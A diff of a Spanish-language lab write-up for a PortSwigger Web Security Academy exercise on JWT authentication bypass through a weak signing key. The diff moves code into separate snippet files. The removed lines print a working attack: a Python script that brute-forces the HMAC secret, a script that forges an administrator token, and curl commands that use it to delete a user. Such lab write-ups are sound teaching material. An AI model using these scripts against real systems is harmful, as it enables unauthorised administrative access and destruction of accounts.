@@ -10,6 +10,7 @@ lang: "es"
 
 import CollapsiblePartial from '../../../components/CollapsiblePartial.astro';
 import PartialContainer from '../../../components/PartialContainer.astro';
+import CodeSnippet from '../../../components/CodeSnippet.astro';
 
 ## Conceptos Previos Necesarios Para Resolver El Lab
 
@@ -22,28 +23,15 @@ import PartialContainer from '../../../components/PartialContainer.astro';
 
 Exploremos la página de login del lab directamente e iniciemos sesión para obtener un token JWT de sesión válido:
 
-```bash
-curl "https://<lab-url>.web-security-academy.net/login"
-```
+<CodeSnippet file="jwt-authentication-bypass-via-weak-signing-key/01-bash.sh" />
 
 La página de login tiene un formulario simple con un token CSRF:
 
-```html
-<form class=login-form method=POST action="/login">
-    <input required type="hidden" name="csrf" value="fthIkYLXgsmolAFaGeb1sSSEMeShaZtX">
-    <label>Username</label>
-    <input required type=username name="username" autofocus>
-    <label>Password</label>
-    <input required type=password name="password">
-    <button class=button type=submit> Log in </button>
-</form>
-```
+<CodeSnippet file="jwt-authentication-bypass-via-weak-signing-key/02-html.html" />
 
 Iniciemos sesión con las credenciales proporcionadas:
 
-```bash
-curl -D - "https://<lab-url>.web-security-academy.net/login" -d "csrf=KmODI4GCLxAFAM1LoQhLZpDVOO1kPySm&username=wiener&password=peter"
-```
+<CodeSnippet file="jwt-authentication-bypass-via-weak-signing-key/03-bash.sh" />
 
 > **Desglose del comando**: \
 `-D -` = mostrar cabeceras de respuesta en stdout \
@@ -51,17 +39,11 @@ curl -D - "https://<lab-url>.web-security-academy.net/login" -d "csrf=KmODI4GCLx
 
 Respuesta:
 
-```
-HTTP/2 302 
-location: /my-account?id=wiener
-set-cookie: session=eyJraWQiOiIxNzBjMzUxZS01OGNjLTRlNGItOTExNi02ZTc5MjQzMzc1ODAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjE5ODk1Nywic3ViIjoid2llbmVyIn0.YBG0i0B9Qamr6Gw50igBg_ZdwEbbzUPzHKIpG_ecBOk; Secure; HttpOnly; SameSite=None
-```
+<CodeSnippet file="jwt-authentication-bypass-via-weak-signing-key/04-plain.http" />
 
 La cookie de sesión es un token JWT. Decodifiquémoslo para entender su estructura:
 
-```bash
-echo "eyJraWQiOiIxNzBjMzUxZS01OGNjLTRlNGItOTExNi02ZTc5MjQzMzc1ODAiLCJhbGciOiJIUzI1NiJ9" | base64 -d | jq .
-```
+<CodeSnippet file="jwt-authentication-bypass-via-weak-signing-key/05-bash.sh" />
 
 > **Desglose del comando**: \
 `echo "..."` = imprimir la parte del header del JWT \
@@ -70,58 +52,19 @@ echo "eyJraWQiOiIxNzBjMzUxZS01OGNjLTRlNGItOTExNi02ZTc5MjQzMzc1ODAiLCJhbGciOiJIUz
 
 Salida del header:
 
-```json
-{
-  "kid": "170c351e-58cc-4e4b-9116-6e7924337580",
-  "alg": "HS256"
-}
-```
+<CodeSnippet file="jwt-authentication-bypass-via-weak-signing-key/06-json.json" />
 
 Ahora decodifiquemos el payload:
 
-```bash
-echo "eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjE5ODk1Nywic3ViIjoid2llbmVyIn0" | base64 -d | jq .
-```
+<CodeSnippet file="jwt-authentication-bypass-via-weak-signing-key/07-bash.sh" />
 
 Salida del payload:
 
-```json
-{
-  "iss": "portswigger",
-  "exp": 1772198957,
-  "sub": "wiener"
-}
-```
+<CodeSnippet file="jwt-authentication-bypass-via-weak-signing-key/08-json.json" />
 
 El JWT usa **HS256** (HMAC-SHA256) para la firma, lo que significa que utiliza una clave secreta simétrica. Si el secreto es débil, podemos descubrirlo por fuerza bruta. Creemos un script de Python para crackear la clave de firma JWT usando el diccionario sugerido en la descripción del lab:
 
-```python
-import hmac
-import hashlib
-import base64
-import urllib.request
-
-JWT = "eyJraWQiOiIxNzBjMzUxZS01OGNjLTRlNGItOTExNi02ZTc5MjQzMzc1ODAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjE5ODk1Nywic3ViIjoid2llbmVyIn0.YBG0i0B9Qamr6Gw50igBg_ZdwEbbzUPzHKIpG_ecBOk"
-
-WORDLIST_URL = "https://raw.githubusercontent.com/wallarm/jwt-secrets/refs/heads/master/jwt.secrets.list"
-
-header, payload, target_signature = JWT.split('.')
-
-wordlist = urllib.request.urlopen(WORDLIST_URL)
-
-def create_jwt_signature_from_secret(secret):
-    message = f"{header}.{payload}"
-    hmac_digest = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
-    jwt_signature = base64.urlsafe_b64encode(hmac_digest).decode().rstrip('=')
-    return jwt_signature
-
-for secret in wordlist.read().decode().splitlines():
-    if target_signature == create_jwt_signature_from_secret(secret):
-        print(f"Found secret: {secret}")
-        break
-else:
-    print("Secret not found")
-```
+<CodeSnippet file="jwt-authentication-bypass-via-weak-signing-key/09-python.py" />
 
 > **Desglose del script**: \
 > El script realiza un ataque de fuerza bruta a la firma JWT:
@@ -134,35 +77,13 @@ else:
 
 Salida esperada:
 
-```
-Found secret: secret1
-```
+<CodeSnippet file="jwt-authentication-bypass-via-weak-signing-key/10-plain.txt" />
 
 Ahora podemos forjar un JWT con `sub: "administrator"` para obtener acceso de administrador.
 
 Creemos un script para forjar el token:
 
-```python
-import hmac
-import hashlib
-import base64
-
-JWT_SECRET = "secret1"
-
-def b64(data): return base64.urlsafe_b64encode(data).decode().rstrip('=')
-
-header = '{"kid":"170c351e-58cc-4e4b-9116-6e7924337580","alg":"HS256"}'
-
-tampered_jwt_payload = '{"iss":"portswigger","exp":1772198957,"sub":"administrator"}'
-
-message = f"{b64(header.encode())}.{b64(tampered_jwt_payload.encode())}"
-
-forged_signature = b64(hmac.new(JWT_SECRET.encode(), message.encode(), hashlib.sha256).digest())
-
-admin_jwt = f"{message}.{forged_signature}"
-
-print(admin_jwt)
-```
+<CodeSnippet file="jwt-authentication-bypass-via-weak-signing-key/11-python.py" />
 
 > **Desglose del script**: \
 > El script crea un nuevo JWT con:
@@ -172,17 +93,11 @@ print(admin_jwt)
 
 Salida de ejemplo:
 
-```
-eyJraWQiOiIxNzBjMzUxZS01OGNjLTRlNGItOTExNi02ZTc5MjQzMzc1ODAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjE5ODk1Nywic3ViIjoiYWRtaW5pc3RyYXRvciJ9._c625IJtnNvYYk8TptqMszoBMxuItUXT4yWqgRXNhXs
-```
+<CodeSnippet file="jwt-authentication-bypass-via-weak-signing-key/12-plain.txt" />
 
 Ahora accedamos al panel de administración con nuestro JWT forjado:
 
-```bash
-curl -s "https://<lab-url>.web-security-academy.net/admin" \
-  -b "session=eyJraWQiOiIxNzBjMzUxZS01OGNjLTRlNGItOTExNi02ZTc5MjQzMzc1ODAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjE5ODk1Nywic3ViIjoiYWRtaW5pc3RyYXRvciJ9._c625IJtnNvYYk8TptqMszoBMxuItUXT4yWqgRXNhXs" \
-  | grep -A 5 "carlos"
-```
+<CodeSnippet file="jwt-authentication-bypass-via-weak-signing-key/13-bash.sh" />
 
 > **Desglose del comando**: \
 `-b "session=..."` = enviar el JWT forjado como cookie de sesión \
@@ -190,17 +105,11 @@ curl -s "https://<lab-url>.web-security-academy.net/admin" \
 
 Respuesta:
 
-```html
-<span>carlos - </span>
-<a href="/admin/delete?username=carlos">Delete</a>
-```
+<CodeSnippet file="jwt-authentication-bypass-via-weak-signing-key/14-html.html" />
 
 Ahora que tenemos acceso de administrador, eliminemos al usuario carlos:
 
-```bash
-curl -s "https://<lab-url>.web-security-academy.net/admin/delete?username=carlos" \
-  -b "session=eyJraWQiOiIxNzBjMzUxZS01OGNjLTRlNGItOTExNi02ZTc5MjQzMzc1ODAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjE5ODk1Nywic3ViIjoiYWRtaW5pc3RyYXRvciJ9._c625IJtnNvYYk8TptqMszoBMxuItUXT4yWqgRXNhXs"
-```
+<CodeSnippet file="jwt-authentication-bypass-via-weak-signing-key/15-bash.sh" />
 
 El bypass de autenticación JWT nos permitió **enviar a carlos al vacío digital**, completando el lab.
 
